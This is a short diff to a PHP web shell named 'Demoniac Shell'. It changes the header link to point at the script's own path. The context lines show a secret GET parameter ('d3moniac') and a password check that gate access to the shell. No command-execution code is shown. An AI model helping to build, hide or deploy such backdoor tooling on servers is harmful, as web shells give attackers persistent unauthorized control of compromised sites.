@@ -131,7 +131,7 @@ if(!isset($_GET['d3moniac']) && !isset($_SESSION['auth']) && $_SESSION['auth'] !
     </head>
     <body>
         <div style="position:fixed;top:0;left:0;background-image: linear-gradient(0deg, #3B0000, black);width:100%;height:100%;z-index:-99;"></div>
-        <h1 style="text-align: center; text-shadow: 0px 0px 6px red;"><a href=".">⛧ Demoniac Shell ⛧</a></h1>
+        <h1 style="text-align: center; text-shadow: 0px 0px 6px red;"><a href="<?php echo $_SERVER['SCRIPT_NAME'];?>">⛧ Demoniac Shell ⛧</a></h1>
         <?php
             if(!isset($_SESSION['auth']) && $_SESSION['auth'] != md5(crypt($_POST['pass'], $pass_salt))){
         ?>
